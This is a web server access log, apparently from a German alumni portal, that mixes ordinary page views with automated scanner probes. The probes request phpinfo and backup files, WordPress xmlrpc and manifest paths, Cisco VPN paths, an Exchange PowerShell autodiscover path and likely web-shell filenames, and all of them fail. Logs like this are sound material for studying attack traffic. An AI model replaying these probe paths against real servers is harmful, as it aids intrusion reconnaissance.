user;timestamp;referer;target;method;status
1cfc3f4362334ce9b82b2000bc3b6628c180acf6e1e728f253edcd935f1bb49b;2025-11-17 22:35:54;;/ifm.php;GET;404
1cfc3f4362334ce9b82b2000bc3b6628c180acf6e1e728f253edcd935f1bb49b;2025-11-17 22:35:54;;/thxt.php;GET;404
1cfc3f4362334ce9b82b2000bc3b6628c180acf6e1e728f253edcd935f1bb49b;2025-11-17 22:35:54;;/kairolin.php;GET;404
1cfc3f4362334ce9b82b2000bc3b6628c180acf6e1e728f253edcd935f1bb49b;2025-11-17 22:35:54;;/siln.php;GET;404
3c9e99393cb928b32711f81e2f04bc81ab32b2c517b3161e4eb8dc50eb774da4;2025-11-17 22:37:25;;/personen/alumni/schule/170720;GET;200
3803854f4d43907b1b5e9fe3e86b8decea4834bf4f65d882f6e3fb1c0f4c8157;2025-11-17 22:48:29;;/personen/alumni/schule/59000;GET;200
67f9d703778c2a08657361e070fc19f3fd3f8fc71569edb4599709b65b399325;2025-11-17 23:00:02;;/personen/alumni/schule/4540118;GET;200
27b718383c8d9ddb87a5396ac57214c4c21e458085e4facc10d6f858b763f56f;2025-11-17 23:05:16;;/aktuelles/meldungen;GET;200
3f603d208d3bd8b4d45244a3ae56bd763c466b91ae01ae571479c38b514cd42a;2025-11-17 23:07:27;;/personen/alumni/details/dilek-keskin;GET;200
37f2e1aa805df3be0c22832174e29570eb0cd68fc779532cfccfdaaeba5a129e;2025-11-17 23:11:11;;/personen/alumni/schule/170574;GET;200
fa9e55ab6933c69701bfa3239e5b946e3fb50f8c6e6ddd9fb6b200fa4575d889;2025-11-17 23:11:22;;/lc/libs/livecycle/core/content/login.html;GET;404
99f4f12d0d87dd465e352971875d3b6bcbe01b3ad9a38e68404d77253b075eb6;2025-11-17 23:14:57;;/;GET;200
b2e6996332da6c2d8331992b81e4e2335fca6155f75a7eeeb846ad553dce7229;2025-11-17 23:15:50;;/docs/img/uml-composition.png;GET;404
255b188ac3d7988d5b7b84f3d91d94374acdd210fc447dbab1f889695efd8395;2025-11-17 23:18:17;;/personen/alumni/schule/4240545;GET;200
273524b30ad2fa87db5fd83b322b506c9abef63b35c53ce5049342f895b7d136;2025-11-17 23:18:24;;/+CSCOL+/Java.jar;GET;404
273524b30ad2fa87db5fd83b322b506c9abef63b35c53ce5049342f895b7d136;2025-11-17 23:18:24;;/+CSCOE+/logon_forms.js;GET;404
273524b30ad2fa87db5fd83b322b506c9abef63b35c53ce5049342f895b7d136;2025-11-17 23:18:26;;/+CSCOL+/a1.jar;GET;404
273524b30ad2fa87db5fd83b322b506c9abef63b35c53ce5049342f895b7d136;2025-11-17 23:18:27;;/+CSCOE+/transfer.js;GET;404
8b89e5fa4515e50ad82e7ad75af6d5397ee7a9a0054652c29757598376f26df1;2025-11-17 23:30:32;;/personen/alumni/schule/4240628;GET;200
bd500ab1b7eb877cda3cf1310d9fe547a9de1762fcda557958ff6a9364531a0e;2025-11-17 23:34:00;;/;GET;200
f399a2405326351ddad072fe81132c88f302ba2af9de93f5d62d6d60df7684a6;2025-11-17 23:38:29;;/personen/alumni/details/olaf-schaeffer;GET;200
c59b51e8fe46fda721c0b46320a60ad90add930500539cc213bc2f8294ee755b;2025-11-17 23:39:08;;/personen/alumni/schule/4440541;GET;200
c2989ce1a2c1860b673e5cb1a6d01afc46190b00b3443a5492cf97d6f9e8c4ac;2025-11-17 23:40:54;;/;GET;200
4d0e6b308d812411a1cb1d4543c3c89fc244784ce2fa53d9ee420fd3b46c87d6;2025-11-17 23:40:57;;/;GET;200
c2989ce1a2c1860b673e5cb1a6d01afc46190b00b3443a5492cf97d6f9e8c4ac;2025-11-17 23:41:22;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
c2989ce1a2c1860b673e5cb1a6d01afc46190b00b3443a5492cf97d6f9e8c4ac;2025-11-17 23:41:22;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
c2989ce1a2c1860b673e5cb1a6d01afc46190b00b3443a5492cf97d6f9e8c4ac;2025-11-17 23:41:22;;/personen;GET;200
c2989ce1a2c1860b673e5cb1a6d01afc46190b00b3443a5492cf97d6f9e8c4ac;2025-11-17 23:41:23;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
c2989ce1a2c1860b673e5cb1a6d01afc46190b00b3443a5492cf97d6f9e8c4ac;2025-11-17 23:41:26;;/themen/details/der-start-ins-studium;GET;200
c2989ce1a2c1860b673e5cb1a6d01afc46190b00b3443a5492cf97d6f9e8c4ac;2025-11-17 23:41:28;;/themen/details/abschied-aus-moabit;GET;200
c2989ce1a2c1860b673e5cb1a6d01afc46190b00b3443a5492cf97d6f9e8c4ac;2025-11-17 23:41:29;;/aktuelles/stellenangebote;GET;200
3dc2a43ecf2dfc86c1cdf2811e836c2033832f5cfda08bdff57c1bb44eefcdc8;2025-11-17 23:46:41;;/;GET;200
6bf2faf0dd32fb6e3fcd8d18f10e8034591240600b1c99bd37477be1ecd95d0b;2025-11-17 23:47:14;;/personen/alumni/schule/40745;GET;200
ef72a619f7d72b94e65d7ef8f50211ffc419bfb5bfb60f5d5b5e80f8d4070f8e;2025-11-17 23:48:56;;/;GET;200
ce036983705820e8d373c67c2dcf65b804610840fb4912644ba2306f11ac3a3a;2025-11-18 00:03:24;;/personen;GET;200
f35d76c4cd4aad70a669eeba36b521159a65a36cffa9e125b8e168f15eb5e314;2025-11-18 00:17:34;;/themen/details/david-gegen-goliath;GET;200
b3a04d2cdb31b5fdcc1ced32ea0f3e1232acd42d7578bb03b22d26569da0b30d;2025-11-18 00:27:38;;/personen/alumni/details/heidi-burghard;GET;200
60a3b8a34de89a248b264a70196cc84d57bf76418a2ece95a1d05927134245d3;2025-11-18 00:36:14;;/;GET;200
a7f9ca8d0febfcbe6eb4761d5247751fbe04e30332d17bea27281f61580b6c52;2025-11-18 00:37:09;;/personen/alumni/schule/10A04;GET;200
188f8ae6fccf990f2a8b777e29c1590a715817164f821edf6b188ec0a6b2e881;2025-11-18 00:43:25;;/autodiscover/autodiscover.json?@zdi/Powershell;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:25;;/;GET;200
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:26;;//wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:26;;//xmlrpc.php?rsd;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:26;;/;GET;200
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:26;;//blog/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:27;;//web/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:27;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:27;;//website/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:28;;//wp/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:28;;//news/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:28;;//2018/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:28;;//2019/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:28;;//shop/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:29;;//wp1/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:29;;//test/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:29;;//media/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:29;;//wp2/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:30;;//site/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:30;;//cms/wp-includes/wlwmanifest.xml;GET;404
b45555cd95bca30d2aecadd22242b2a9aca86e7a7241fc73f4ca9fdfc4a21ae9;2025-11-18 00:48:30;;//sito/wp-includes/wlwmanifest.xml;GET;404
aa0d3993c62c19dc9d5f19fc151ada8728e6f6c4c83dc33936ec956e87b2b9a5;2025-11-18 00:50:54;;/;GET;200
aa0d3993c62c19dc9d5f19fc151ada8728e6f6c4c83dc33936ec956e87b2b9a5;2025-11-18 00:51:19;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
aa0d3993c62c19dc9d5f19fc151ada8728e6f6c4c83dc33936ec956e87b2b9a5;2025-11-18 00:51:22;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
aa0d3993c62c19dc9d5f19fc151ada8728e6f6c4c83dc33936ec956e87b2b9a5;2025-11-18 00:51:23;;/personen;GET;200
aa0d3993c62c19dc9d5f19fc151ada8728e6f6c4c83dc33936ec956e87b2b9a5;2025-11-18 00:51:24;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
aa0d3993c62c19dc9d5f19fc151ada8728e6f6c4c83dc33936ec956e87b2b9a5;2025-11-18 00:51:27;;/themen/details/der-start-ins-studium;GET;200
aa0d3993c62c19dc9d5f19fc151ada8728e6f6c4c83dc33936ec956e87b2b9a5;2025-11-18 00:51:28;;/aktuelles/stellenangebote;GET;200
aa0d3993c62c19dc9d5f19fc151ada8728e6f6c4c83dc33936ec956e87b2b9a5;2025-11-18 00:51:29;;/themen/details/abschied-aus-moabit;GET;200
9b06b22df948a0ac6e7b476490cfbd5c04e2a6c305b4c88605095120aa8fba2d;2025-11-18 00:52:16;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
ab4c4a7d2d44cef82ce059e16fe7461fb2d46ce24e330fd08023660d94d29d62;2025-11-18 00:55:26;;/reset-password;GET;200
58b24007c60dab5c5419e584adccdb7cd5356c203b6e22eb7bc41ee26a42b701;2025-11-18 00:56:12;;/personen/alumni/details/asja-apelt-genannt-henze;GET;200
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:03:48;;/;GET;200
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:03:53;;/assets/app/form.js;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:04:05;;/assets/app/core.js;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:04:07;;/assets/@symfony/stimulus-bundle/controllers.js;GET;404
f60a1195a54ff55ac800c733611cd187edd86510c8d04f35cb1c26c959bcd42e;2025-11-18 01:04:11;;/personen/alumni/schule/4240016;GET;200
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:04:13;;/assets/@symfony/ux-turbo/turbo_controller.js;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:04:15;;/assets/controllers/hello_controller.js;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:04:20;;/assets/controllers/form-collection_controller.js;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:05:24;;/phpinfo.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:05:37;;/_profiler/phpinfo;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:03;;/php_info.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:03;;/info.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:03;;/info2.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:03;;/test.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:03;;/phpinfo;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:04;;/php_version.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:04;;/info1.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:04;;/pi.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:04;;/php.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:05;;/serverinfo.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:05;;/phpversion.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:05;;/i.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:05;;/server.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:15;;/debug.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:38;;/diagnostic.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:38;;/check.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:38;;/info.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:38;;/phpinfo.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:38;;/phptest.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:38;;/php_info.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:55;;/info.php.bak;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:55;;/php_info.php.bak;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:56;;/php_info.php.old;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:56;;/phpinfo.php.bak;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:56;;/test.php.old;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:56;;/info.php.orig;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:56;;/info.php.old;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:56;;/test.php.bak;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:57;;/phpinfo.php.old;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:57;;/phpinfo.php.backup;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:57;;/test.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:58;;/phpinfo.php.orig;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:58;;/phpinfo.php~;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:58;;/info.php.backup;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:58;;/info.php~;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:58;;/test.php.orig;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:58;;/php_info.php~;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:59;;/php_info.php.backup;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:59;;/test.php.backup;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:06:59;;/php_info.php.orig;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:07:15;;/test.php~;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:07:17;;/php_info.php.swp;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:07:17;;/phpinfo.php.tmp;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:07:17;;/phpinfo.php.swp;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:07:17;;/info.php.tmp;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:07:17;;/test.php.swp;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:07:17;;/php_info.php.tmp;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:07:17;;/test.php.tmp;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:07:17;;/admin/phpinfo.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:07:18;;/info.php.swp;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:07:22;;/admin/info.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:07:36;;/admin/phpinfo.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:04;;/admin/info.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:15;;/test/phpinfo.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:15;;/test/info.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:15;;/dev/phpinfo.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/test/info.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/test/phpinfo.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/tmp/phpinfo.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/tmp/info.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/dev/info.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/dev/phpinfo.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/includes/info.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/tmp/info.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/includes/phpinfo.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/tmp/phpinfo.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/dev/info.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/scripts/info.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/includes/info.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/includes/phpinfo.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/scripts/phpinfo.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/scripts/phpinfo.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:16;;/scripts/info.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:08:58;;/public/phpinfo.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:09;;/public/info.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:09;;/public/info.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:09;;/web/phpinfo.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:09;;/public/phpinfo.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:09;;/web/phpinfo.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:10;;/web/info.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:11;;/web/info.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:19;;/www/phpinfo.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:21;;/www/info.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:30;;/www/phpinfo.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:40;;/www/info.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:49;;/site/phpinfo.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:49;;/site/info.php;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:50;;/site/info.php.save;GET;404
683e546cd50920cd5545f6dae342c9ef9424d07ea2bf1d3345cec9ca128825d9;2025-11-18 01:09:50;;/site/phpinfo.php;GET;404
cd64b48e213c364ba8bbf1f9ea620f18cb8d8579c28601fd382fb1796b77b3dc;2025-11-18 01:11:44;;/;GET;200
0cd0a52058a589045bebda2bc6529b67360def77934e407e63a3c01911dd79a3;2025-11-18 01:12:59;;/personen/alumni/details/felix-fischer;GET;200
68802343cefad432d6ee14ab959d7d77183159d4d23bc11bd0566806ae86cbc5;2025-11-18 01:19:36;;/gruppen/hobby/fremdsprachen;GET;302
68802343cefad432d6ee14ab959d7d77183159d4d23bc11bd0566806ae86cbc5;2025-11-18 01:19:40;/gruppen/hobby/fremdsprachen;/gruppen;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-18 01:22:30;/gruppen/hobby/finanzbildung;/gruppen/hobby/tanzen;GET;302
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-18 01:22:31;/gruppen/hobby/finanzbildung;/gruppen;GET;200
bd94088bdee6771deb280429fb10507ce01233da510faa67ebb3d2d14e22e491;2025-11-18 01:23:52;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;/aktuelles/meldungen?category=wissenschaft;GET;200
